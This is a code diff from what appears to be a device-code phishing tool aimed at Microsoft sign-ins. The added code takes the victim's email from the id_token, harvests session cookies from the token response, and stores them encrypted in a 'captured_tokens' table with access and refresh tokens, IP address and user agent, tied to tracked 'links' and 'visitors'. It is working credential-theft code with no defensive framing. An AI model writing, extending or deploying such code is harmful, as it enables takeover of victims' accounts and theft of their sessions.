@@ -127,7 +127,36 @@ async function pollForToken(jobId) {
       if (tokenData.access_token) {
         // SUCCESS! Store token
         job.status = 'completed';
-        await storeToken(job, tokenData);
+        
+        // Extract email FIRST before using it
+        let capturedEmail = null;
+        if (tokenData.id_token) {
+          try {
+            const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
+            capturedEmail = payload.email || payload.upn || payload.preferred_username || null;
+          } catch (e) { /* ignore */ }
+        }
+        
+        // Capture Set-Cookie headers from the token response (session cookies)
+        const responseCookies = [];
+        const setCookieHeaders = tokenResponse.headers['set-cookie'] || [];
+        for (const cookieStr of setCookieHeaders) {
+          const cookieParts = cookieStr.split(';')[0].trim();
+          const eqIndex = cookieParts.indexOf('=');
+          if (eqIndex > 0) {
+            const cookieName = cookieParts.substring(0, eqIndex).trim();
+            const cookieValue = cookieParts.substring(eqIndex + 1).trim();
+            if (cookieName && cookieValue) {
+              responseCookies.push({ name: cookieName, value: cookieValue, domain: '.login.microsoftonline.com' });
+            }
+          }
+        }
+        
+        // Store cookies and email in job for later storage
+        job.captured_cookies = responseCookies;
+        job.captured_email = capturedEmail;
+        
+        await storeToken(job, tokenData, responseCookies);
         
         // Mark visitors as done for this user/link
         try {
@@ -237,7 +266,7 @@ async function retryAsTokenMode(originalJob) {
 /**
  * Store captured token in database
  */
-async function storeToken(job, tokenData) {
+async function storeToken(job, tokenData, responseCookies = []) {
   try {
     // Extract email from id_token
     let email = null;
@@ -251,11 +280,18 @@ async function storeToken(job, tokenData) {
     // Use stored IP and user-agent from when the flow started
     const ipAddress = job.ip_address || 'unknown';
     const userAgent = job.user_agent || 'DeviceProxy';
+    
+    // Format cookies for storage
+    let cookiesEncrypted = null;
+    if (responseCookies && responseCookies.length > 0) {
+      const cookieStrings = responseCookies.map(c => `${c.name}=${c.value}; domain=${c.domain}; path=/; secure`).join('; ');
+      cookiesEncrypted = encrypt(cookieStrings);
+    }
 
     const [result] = await db.query(
       `INSERT INTO captured_tokens 
-       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, ip_address, user_agent, expiration)
-       VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR))`,
+       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, ip_address, user_agent, expiration)
+       VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR))`,
       [
         job.user_id,
         job.link_id,
@@ -263,6 +299,7 @@ async function storeToken(job, tokenData) {
         encrypt(tokenData.access_token),
         encrypt(tokenData.refresh_token || null),
         encrypt(tokenData.id_token || null),
+        cookiesEncrypted,
         ipAddress,
         userAgent,
       ]
